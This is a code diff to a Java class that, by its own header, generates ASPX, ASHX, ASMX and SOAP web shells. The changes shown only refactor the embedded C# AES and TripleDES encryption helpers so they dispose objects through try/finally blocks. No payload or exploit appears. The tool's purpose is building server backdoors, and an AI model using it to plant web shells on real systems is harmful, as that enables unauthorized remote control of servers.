@@ -15,7 +15,7 @@ import java.util.*;
  * Generates ASPX, ASHX, ASMX, and SOAP web shells (.NET Standard 2.0)
  * by filling template placeholders with implementations derived from the Profile configuration.
  * <p>
- * This is the .NET counterpart of {@link NoOneWebShellGenerator}, which handles JSP/JSPX.
+ * This is the .NET counterpart of {@link NoOneJavaWebShellGenerator}, which handles JSP/JSPX.
  *
  * @author ReaJason
  */
@@ -521,6 +521,8 @@ public class NoOneDotNetWebShellGenerator {
 
         if (needed.contains("xor")) append(sb, HELPER_XOR);
         if (needed.contains("cipherHelper")) {
+            append(sb, HELPER_TRY_DISPOSE);
+            append(sb, HELPER_FILL_RANDOM_BYTES);
             append(sb, HELPER_CIPHER_ENCRYPT);
             append(sb, HELPER_CIPHER_DECRYPT);
         }
@@ -712,6 +714,31 @@ public class NoOneDotNetWebShellGenerator {
             return output;
         }""";
 
+    private static final String HELPER_TRY_DISPOSE = """
+        private static void TryDispose(object instance)
+        {
+            System.IDisposable disposable = instance as System.IDisposable;
+            if (disposable != null)
+            {
+                disposable.Dispose();
+            }
+        }""";
+
+    private static final String HELPER_FILL_RANDOM_BYTES = """
+        private static void FillRandomBytes(byte[] buffer)
+        {
+            RandomNumberGenerator rng = null;
+            try
+            {
+                rng = RandomNumberGenerator.Create();
+                rng.GetBytes(buffer);
+            }
+            finally
+            {
+                TryDispose(rng);
+            }
+        }""";
+
     private static final String HELPER_CIPHER_ENCRYPT = """
         private static byte[] CipherEncrypt(SymmetricAlgorithm algo, int ivLen, byte[] plaintext, byte[] keyBytes)
         {
@@ -719,15 +746,18 @@ public class NoOneDotNetWebShellGenerator {
             algo.Mode = CipherMode.CBC;
             algo.Padding = PaddingMode.PKCS7;
             byte[] iv = new byte[ivLen];
-            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
-            {
-                rng.GetBytes(iv);
-            }
+            FillRandomBytes(iv);
             algo.IV = iv;
             byte[] encrypted;
-            using (ICryptoTransform encryptor = algo.CreateEncryptor())
+            ICryptoTransform encryptor = null;
+            try
             {
+                encryptor = algo.CreateEncryptor();
                 encrypted = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);
+            }
+            finally
+            {
+                TryDispose(encryptor);
             }
             byte[] result = new byte[iv.Length + encrypted.Length];
             System.Buffer.BlockCopy(iv, 0, result, 0, iv.Length);
@@ -747,45 +777,75 @@ public class NoOneDotNetWebShellGenerator {
             int cipherLen = ciphertextWithIv.Length - ivLen;
             byte[] encrypted = new byte[cipherLen];
             System.Buffer.BlockCopy(ciphertextWithIv, ivLen, encrypted, 0, cipherLen);
-            using (ICryptoTransform decryptor = algo.CreateDecryptor())
+            ICryptoTransform decryptor = null;
+            try
             {
+                decryptor = algo.CreateDecryptor();
                 return decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
+            }
+            finally
+            {
+                TryDispose(decryptor);
             }
         }""";
 
     private static final String HELPER_AES_ENCRYPT = """
         private static byte[] AesEncrypt(byte[] data, byte[] key)
         {
-            using (Aes aes = Aes.Create())
+            Aes aes = null;
+            try
             {
+                aes = Aes.Create();
                 return CipherEncrypt(aes, 16, data, key);
+            }
+            finally
+            {
+                TryDispose(aes);
             }
         }""";
 
     private static final String HELPER_AES_DECRYPT = """
         private static byte[] AesDecrypt(byte[] data, byte[] key)
         {
-            using (Aes aes = Aes.Create())
+            Aes aes = null;
+            try
             {
+                aes = Aes.Create();
                 return CipherDecrypt(aes, 16, data, key);
+            }
+            finally
+            {
+                TryDispose(aes);
             }
         }""";
 
     private static final String HELPER_TRIPLE_DES_ENCRYPT = """
         private static byte[] TripleDesEncrypt(byte[] data, byte[] key)
         {
-            using (TripleDES des = TripleDES.Create())
+            TripleDES des = null;
+            try
             {
+                des = TripleDES.Create();
                 return CipherEncrypt(des, 8, data, key);
+            }
+            finally
+            {
+                TryDispose(des);
             }
         }""";
 
     private static final String HELPER_TRIPLE_DES_DECRYPT = """
         private static byte[] TripleDesDecrypt(byte[] data, byte[] key)
         {
-            using (TripleDES des = TripleDES.Create())
+            TripleDES des = null;
+            try
             {
+                des = TripleDES.Create();
                 return CipherDecrypt(des, 8, data, key);
+            }
+            finally
+            {
+                TryDispose(des);
             }
         }""";
 
